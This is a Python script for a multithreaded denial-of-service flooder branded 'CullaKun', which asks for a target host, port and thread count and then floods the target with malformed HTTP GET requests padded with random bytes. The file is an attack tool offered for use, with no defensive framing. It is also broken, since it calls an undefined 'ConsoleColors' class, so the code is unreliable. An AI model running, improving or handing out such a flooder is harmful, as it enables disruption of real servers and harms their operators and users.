import socket
import sys
import time
import os
import random

from threading import Thread

os.system("clear")

if not __name__ == "__main__":
    exit()
      
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    
print(Colors.BOLD + ConsoleColors.WARNING + '''
Banner 

         
      ''')
    
def getport():
    try:
        p = int(input(Colors.BOLD + Colors.OKGREEN + "╰─> Port:\r\n"))
        return p
    except ValueError:
        print(Colors.BOLD + Colors.WARNING + "ERROR Port must be a number, Set Port to default " + Colors.OKGREEN + "80")
        return 80
print(Colors.BOLD + "╭──[CullaKun]──⬣")
host = input(Colors.BOLD + Colors.BOLD + "╰─> Host:\r\n")
port = getport()
speedPerRun = int(input(Colors.BOLD + Colors.BOLD + "╰─> Hits Running:\r\n"))
threads = int(input(Colors.BOLD + Colors.BOLD + "╰─> Thread Count:\r\n"))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(2450)

i = 0;



class Count:
    packetCounter = 0 

def goForDosThatThing():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print(Colors.BOLD + Colors.OKGREEN + "Sent the packet" + Colors.FAIL + str(Count.packetCounter) + Colors.OKGREEN + "successful: " + Colors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "> ")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print(Colors.WARNING + "ERROR, Maybe the host is down?!?!")
                    except KeyboardInterrupt:
                        print(Colors.BOLD + Colors.FAIL + "\r\n[-] Canceled by user")
            except socket.error:
                print(Colors.WARNING + "Server error, Please check the host!")
            except KeyboardInterrupt:
                print(Colors.BOLD + Colors.FAIL + "\r\n[-] Canceled by user")
            dosSocket.close()
    except KeyboardInterrupt:
        print(Colors.BOLD + Colors.FAIL + "\r\n[-] Canceled by user")
try:
        
    print(Colors.BOLD + Colors.OKBLUE + '''
    Banner                                                                  
          ''')
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [     1] 0% ")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [     2] 25%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [     3] 50%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [     4] 75%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [        5] 100%")
    
    for i in range(threads):
        try:
            t = Thread(target=goForDosThatThing)
            t.start()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
